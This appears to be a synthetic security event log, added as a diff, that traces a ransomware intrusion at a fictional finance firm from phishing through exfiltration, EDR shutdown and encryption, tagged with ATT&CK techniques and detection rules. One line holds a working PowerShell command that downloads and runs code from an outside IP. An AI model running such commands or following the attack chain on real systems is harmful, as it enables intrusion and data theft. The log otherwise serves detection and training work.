@@ -1,0 +1,19 @@
+2026-06-15 08:14:00 | PHISHING | host=endpoint-soporte-07 | user=a.garcia@finred.gt | event=ATTACHMENT_OPENED | file=factura_Q28000.docx.exe | T1566.001
+2026-06-15 08:15:00 | EXECUTION | host=endpoint-soporte-07 | user=a.garcia@finred.gt | event=POWERSHELL_EXEC | cmd=IEX(New-Object Net.WebClient).DownloadString('http://185.44.21.10/ldr') | T1059.001
+2026-06-15 09:44:00 | C2_COMMS | host=endpoint-soporte-07 | dst_ip=185.44.21.10 | event=BEACON | proto=HTTPS/443 interval=60s | T1071.001
+2026-06-15 12:01:00 | ZT_DETECTION | host=endpoint-soporte-07 | rule=EDR-BEH-C2-BLOCK | event=C2_IP_BLACKLISTED | dst=185.44.21.10 match=OTX_PULSE_LOCKBIT3 action=QUARANTINE | RULE-EDR-001
+2026-06-15 11:14:00 | RECON | host=endpoint-soporte-07 | user=a.garcia@finred.gt | event=NET_SCAN | targets=172.16.10.0/24 ports=22,3389,445 | T1046
+2026-06-16 11:00:00 | CRED_ACCESS | host=endpoint-soporte-07 | user=a.garcia@finred.gt | event=LSASS_READ | tool=reflective_dll pid=768 | T1003
+2026-06-16 12:14:00 | PERSISTENCE | host=endpoint-soporte-07 | user=svc_backup | event=SCHEDULED_TASK | name=WindowsDefenderUpdate cmd=C:\ProgramData\upd.exe | T1053.005
+2026-06-16 14:36:00 | LATERAL | host=portal-soporte-01 | user=svc_backup | event=SMB_EXEC | dst=prod-app-srv-01 tool=psexec_variant | T1570
+2026-06-16 15:19:00 | LATERAL | host=prod-app-srv-01 | user=svc_backup | event=RDP_LOGIN_OK | src=portal-soporte-01 auth=NTLM | T1021.001
+2026-06-18 02:15:00 | EXFILTRATION | host=db-transac-01 | user=svc_backup | event=DB_DUMP | database=transac_prod tables=62 rows=847320 | T1048
+2026-06-18 02:59:00 | EXFILTRATION | host=db-transac-01 | user=svc_backup | event=DATA_UPLOAD | dst_ip=91.220.163.47 size=3.4GB proto=HTTPS/443 | T1048
+2026-06-19 03:54:00 | DEF_EVASION | host=prod-app-srv-01 | agent=EDR_4.2.1 | event=AGENT_KILL | pid=1224 user=svc_backup | T1562.001
+2026-06-19 03:55:00 | DEF_EVASION | host=prod-srv-03 | agent=EDR_4.2.1 | event=AGENT_KILL | pid=1412 user=svc_backup | T1562.001
+2026-06-19 04:01:00 | IMPACT | host=db-transac-01 | process=lockbit3.exe | event=ENCRYPT_START | target=/data/transac/*.db key=AES-256 | T1486
+2026-06-19 04:02:00 | IMPACT | host=auth-srv-01 | process=lockbit3.exe | event=ENCRYPT_START | target=/etc/app/*.conf /var/lib/auth/ | T1486
+2026-06-19 04:03:30 | IMPACT | host=backup-vault | process=lockbit3.exe | event=ENCRYPT_BLOCKED | reason=WORM_LOCK_ACTIVE result=ACCESS_DENIED | T1486
+2026-06-19 04:03:45 | KRI_ALERT | kri=EDR_DESACTIVADO | valor=2 | umbral=0 | status=CRITICO escalado=CISO | RULE-KRI-01
+2026-06-19 04:04:00 | KRI_ALERT | kri=ACCESO_BACKUP_FUERAVENTANA | valor=1 | umbral=0 | status=CRITICO escalado=JefeInfra | RULE-KRI-08
+2026-06-19 04:04:15 | KILL_CHAIN | regla=GRC-FinRed-0601 | correlacion=T1566+T1003+T1570+T1562+T1486 | severidad=P1_CRITICO | accion=AISLAMIENTO+REVOCACION_SESIONES | RULE-KC-0601
